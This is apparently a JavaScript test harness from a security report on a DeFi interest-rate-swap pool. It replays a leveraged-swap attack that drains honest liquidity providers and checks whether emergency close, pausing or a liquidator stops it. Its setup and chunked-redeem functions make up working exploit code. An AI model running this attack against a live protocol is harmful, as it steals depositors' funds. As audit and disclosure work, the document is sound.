// Can the protocol stop the attack once it is live, and what does the attacker actually lose?
//   A) baseline: attacker holds to 90d and redeems            -> the profit reported in REPORT.md
//   B) owner calls emergencyCloseSwapsUsdc on day 30          -> swap liquidated, SOAP rebalanced
//   C) pause guardian pauses redeemFromAmmPoolUsdc at 90d     -> attacker frozen, mark still inflated
const { main, RISK_BASE, signRisk, E18, PAD } = require('./poc');
const { ethers } = require('ethers');

const INDEX = 5n * 10n ** 16n;
const f = (x) => (Number(x) / 1e6).toLocaleString('en-US', { maximumFractionDigits: 0 });
const M = (x) => Number(x) / 1e6;

async function setup({ honestUsdc, atkUsdc, collateralUsdc, leverage, days = 90, feeRate = 5n * 10n ** 14n }) {
    const tenor = { 28: 0n, 60: 1n, 90: 2n }[days];
    const c = await main({ openingFeeRate: feeRate });
    const { P, usdc, oracle, provider, atk, lp, msgSignerWallet, pools, openViaRouter } = c;
    const atkAddr = await atk.getAddress(), lpAddr = await lp.getAddress();
    await c.give(lp, PAD(honestUsdc));
    await c.give(atk, PAD(atkUsdc) + PAD(400_000));
    await (await pools.connect(lp).provideLiquidityUsdc(lpAddr, PAD(honestUsdc), { gasLimit: 5e6 })).wait();
    await (await pools.connect(atk).provideLiquidityUsdc(atkAddr, PAD(atkUsdc), { gasLimit: 5e6 })).wait();
    await (await oracle.updateIndexes([{ asset: P.usdc, indexValue: INDEX, updateTimestamp: 0n, quasiIbtPrice: 0n }])).wait();
    const k = (leverage * feeRate * BigInt(days)) / (365n * E18);
    const total = ((PAD(collateralUsdc) * 10n ** 12n * (E18 + k)) / E18 + 35n * E18) * 10n ** 6n / E18 + 2n;
    await c.give(atk, total);
    const now = BigInt((await provider.getBlock('latest')).timestamp);
    const ins = { ...RISK_BASE, expiration: now + 30n * 86400n };
    await (await openViaRouter.connect(atk).openSwapReceiveFixed90daysUsdc(atkAddr, total, 0n, leverage,
        { ...ins, signature: signRisk(msgSignerWallet, ins, P.usdc, tenor, 1n) }, { gasLimit: 9e6 })).wait();
    return { c, total, atkAddr, tenor, ins, leverage };
}

async function sweepRedeem(c, atkAddr) {
    let got = 0n, remaining = await c.ipToken.balanceOf(atkAddr);
    for (let round = 0; round < 8 && remaining > 0n; round++) {
        let progressed = false;
        for (const pct of [100n, 90n, 80n, 70n, 60n, 50n, 40n, 30n, 20n, 10n, 5n, 2n, 1n]) {
            const chunk = (remaining * pct) / 100n;
            if (chunk === 0n) continue;
            const before = await c.usdc.balanceOf(atkAddr);
            try {
                await (await c.pools.connect(c.atk).redeemFromAmmPoolUsdc(atkAddr, chunk, { gasLimit: 9e6 })).wait();
                got += (await c.usdc.balanceOf(atkAddr)) - before;
                remaining -= chunk; progressed = true; break;
            } catch (e) { }
        }
        if (!progressed) break;
    }
    return got;
}

const adv = async (days, mine = true) => {
    await c0.provider.send('evm_increaseTime', [days * 86400]);
    if (mine) await c0.provider.send('evm_mine', []);
};

let c0;

(async () => {
    // ---------------------------------------------------------------- A. baseline
    {
        const { c, total, atkAddr } = await setup({ honestUsdc: 500_000, atkUsdc: 500_000, collateralUsdc: 74_000, leverage: 1000n * E18 });
        c0 = c;
        const cashBefore = M(await c.usdc.balanceOf(c.P.treasury));
        await adv(90);
        const got = await sweepRedeem(c, atkAddr);
        const profit = got - PAD(500_000) - total;
        console.log(`A  baseline, hold 90d                          cash ${f(PAD(cashBefore * 1e6))} -> ${f(await c.usdc.balanceOf(c.P.treasury))}  atk_out=${f(got)}  NET=${profit > 0n ? '+' : '-'}${f(profit < 0n ? -profit : profit)}`);
    }

    // ---------------------------------------------------------------- B. owner kills the swap at day 30
    {
        const { c, total, atkAddr, ins, leverage, tenor } = await setup({ honestUsdc: 500_000, atkUsdc: 500_000, collateralUsdc: 74_000, leverage: 1000n * E18 });
        c0 = c;
        await adv(30);
        const cashBefore = M(await c.usdc.balanceOf(c.P.treasury));
        const atkBalBefore = await c.usdc.balanceOf(atkAddr);
        const sig = signRisk(c.msgSignerWallet, ins, c.P.usdc, tenor, 1n);
        const risk = { payFixed: { ...ins, signature: sig }, receiveFixed: { ...ins, signature: sig } };
        try {
            await c.closeViaRouter.connect(c.owner).emergencyCloseSwapsUsdc.staticCall([], [1n], risk, { gasLimit: 9e6 });
            await (await c.closeViaRouter.connect(c.owner).emergencyCloseSwapsUsdc([], [1n], risk, { gasLimit: 9e6 })).wait();
            const paidToBuyer = (await c.usdc.balanceOf(atkAddr)) - atkBalBefore;
            console.log(`B  owner emergencyCloseSwapsUsdc on day 30     swap closed, paid to attacker ${f(paidToBuyer)} (collateral was ${f(total)})`);
        } catch (e) {
            console.log(`B  owner emergencyCloseSwapsUsdc on day 30     REVERTED: ${(e.shortMessage || e.message || '').slice(0, 200)}`);
        }
        await adv(60);
        const got = await sweepRedeem(c, atkAddr);
        const profit = got - PAD(500_000) - total;
        console.log(`   then redeem at day 90                       cash ${f(PAD(cashBefore * 1e6))} -> ${f(await c.usdc.balanceOf(c.P.treasury))}  atk_out=${f(got)}  NET=${profit > 0n ? '+' : '-'}${f(profit < 0n ? -profit : profit)}`);
    }

    // ---------------------------------------------------------------- C. pause only
    {
        const { c, total, atkAddr } = await setup({ honestUsdc: 500_000, atkUsdc: 500_000, collateralUsdc: 74_000, leverage: 1000n * E18 });
        c0 = c;
        await adv(90);
        const redeemSel = c.pools.interface.getFunction('redeemFromAmmPoolUsdc').selector;
        const router = new ethers.Contract(c.P.router, ['function addPauseGuardians(address[] calldata) external',
            'function pause(bytes4[] calldata) external', 'function unpause(bytes4[] calldata) external',
            'function paused(bytes4) view returns (uint256)'], c.owner);
        await (await router.connect(c.owner).addPauseGuardians([await c.owner.getAddress()])).wait();
        await (await router.connect(c.owner).pause([redeemSel])).wait();
        console.log(`   paused(redeemFromAmmPoolUsdc) = ${await router.paused(redeemSel)}`);
        let paused = 'did NOT revert';
        try {
            await c.pools.connect(c.atk).redeemFromAmmPoolUsdc.staticCall(atkAddr, 1n, { gasLimit: 9e6 });
        } catch (e) {
            const data = e.data || (e.info && e.info.error && e.info.error.data);
            let reason = '';
            try { reason = ethers.AbiCoder.defaultAbiCoder().decode(['string'], '0x' + data.slice(138))[0]; } catch (_) {}
            paused = `reverted with "${reason || (e.shortMessage || '').slice(0, 60)}"`;
        }
        const rate = await c.pools.getAmmPoolUsdc ? null : null;
        console.log(`C  pause(redeemFromAmmPoolUsdc) at day 90      redeem of 1 ipUSDC -> ${paused}`);
        console.log(`   pool cash is untouched: ${f(await c.usdc.balanceOf(c.P.treasury))}, attacker still holds ${f(await c.ipToken.balanceOf(atkAddr))} ipUSDC (unredeemable until unpause)`);
    }

    // ---------------------------------------------------------------- D. whitelisted liquidator (not the owner multisig)
    {
        const { c, total, atkAddr, ins, tenor } = await setup({ honestUsdc: 500_000, atkUsdc: 500_000, collateralUsdc: 74_000, leverage: 1000n * E18 });
        c0 = c;
        const [, , , liquidator] = [null, null, null, c.lp]; // reuse the spare wallet
        const gov = new ethers.Contract(c.P.router, ['function addSwapLiquidator(address asset, address account) external',
            'function isSwapLiquidator(address asset, address account) view returns (bool)'], c.owner);
        await (await gov.addSwapLiquidator(c.P.usdc, await liquidator.getAddress())).wait();
        await adv(30);
        const sig = signRisk(c.msgSignerWallet, ins, c.P.usdc, tenor, 1n);
        const risk = { payFixed: { ...ins, signature: sig }, receiveFixed: { ...ins, signature: sig } };
        const liquidatorBalBefore = await c.usdc.balanceOf(await liquidator.getAddress());
        try {
            await (await c.closeViaRouter.connect(liquidator).closeSwapsUsdc(await liquidator.getAddress(), [], [1n], risk, { gasLimit: 9e6 })).wait();
            const fee = (await c.usdc.balanceOf(await liquidator.getAddress())) - liquidatorBalBefore;
            console.log(`D  whitelisted liquidator closeSwapsUsdc day 30  swap closed, liquidator fee ${f(fee)}`);
        } catch (e) {
            console.log(`D  whitelisted liquidator closeSwapsUsdc day 30  REVERTED: ${(e.shortMessage || e.message || '').slice(0, 160)}`);
        }
        await adv(60);
        const got = await sweepRedeem(c, atkAddr);
        const profit = got - PAD(500_000) - total;
        console.log(`   then redeem at day 90                       atk_out=${f(got)}  NET=${profit > 0n ? '+' : '-'}${f(profit < 0n ? -profit : profit)}`);
    }

    // ---------------------------------------------------------------- F. thin pool, owner kills it
    {
        const { c, total, atkAddr, ins, tenor } = await setup({ honestUsdc: 200_000, atkUsdc: 50_000, collateralUsdc: 74_000, leverage: 1000n * E18 });
        c0 = c;
        await adv(30);
        const sig = signRisk(c.msgSignerWallet, ins, c.P.usdc, tenor, 1n);
        const risk = { payFixed: { ...ins, signature: sig }, receiveFixed: { ...ins, signature: sig } };
        await (await c.closeViaRouter.connect(c.owner).emergencyCloseSwapsUsdc([], [1n], risk, { gasLimit: 9e6 })).wait();
        await adv(60);
        const got = await sweepRedeem(c, atkAddr);
        const profit = got - PAD(50_000) - total;
        console.log(`F  thin 200k pool, owner closes at day 30       atk_out=${f(got)}  NET=${profit > 0n ? '+' : '-'}${f(profit < 0n ? -profit : profit)}`);
    }

    // ---------------------------------------------------------------- E. same, but with nobody acting and pause only (already C)
})().catch((e) => console.error('FAIL', e.shortMessage || e.message));
